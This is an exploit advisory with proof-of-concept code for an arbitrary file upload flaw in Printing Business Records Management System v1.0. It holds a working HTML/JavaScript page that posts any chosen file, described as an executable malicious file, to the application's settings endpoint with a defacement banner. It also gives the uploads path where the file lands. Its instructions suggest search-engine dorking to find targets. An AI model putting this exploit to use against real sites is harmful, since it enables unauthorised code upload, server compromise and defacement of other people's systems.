=============================================================================================================================================
| # Title     : Printing Business Records Management System v1.0 arbitrary File Upload Vulnerability                                        |
| # Author    : indoushka                                                                                                                   |
| # Tested on : windows 10 Fr(Pro) / browser : Mozilla firefox 130.0.0 (64 bits)                                                            |
| # Vendor    : https://www.kashipara.com/project/download/project2/user/2023/202301/kashipara.com_pbrms-0-zip.zip                          |
=============================================================================================================================================

POC :

[+] Dorking Ä°n Google Or Other Search Enggine.

[+] The following html code uploads a executable malicious file remotely .

[+] Go to the line 33.

[+] save code as poc.html .


<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Direct arbitrary File Upload</title>
</head>
<body>

    <h2>Direct arbitrary File Upload</h2>
    <form id="uploadForm">
        <label for="fileInput">Select File:</label>
        <input type="file" id="fileInput" name="fileInput" required><br><br>

        <button type="button" onclick="uploadFile()">Upload File</button>
    </form>

    <script>
        function uploadFile() {
            const fileInput = document.getElementById('fileInput').files[0];

            if (!fileInput) {
                alert('Please select a file.');
                return;
            }

            const formData = new FormData();
            formData.append('name', '<marquee><font color=lime size=32>Hacked by indoushka</font></marquee>');
            formData.append('img', fileInput);

            console.log("(+) Uploading file...");

            fetch('http://localhost/pbrms/classes/SystemSettings.php?f=update_settings', { // Replace with your upload URL
                method: 'POST',
                body: formData
            })
            .then(response => response.text())
            .then(data => {
                if (data === '1') {
                    console.log("(+) File upload seems to have been successful!");
                } else {
                    console.log("(-) Oh no, the file upload seems to have failed!");
                }
            })
            .catch(error => console.error("(-) Error during file upload:", error));
        }
    </script>

</body>
</html>

        
[+] http://127.0.0.1/music/assets/uploads/


Greetings to :=====================================================================================
jericho * Larry W. Cashdollar * LiquidWorm * Hussin-X * D4NB4R * Malvuln (John Page aka hyp3rlinx)|
===================================================================================================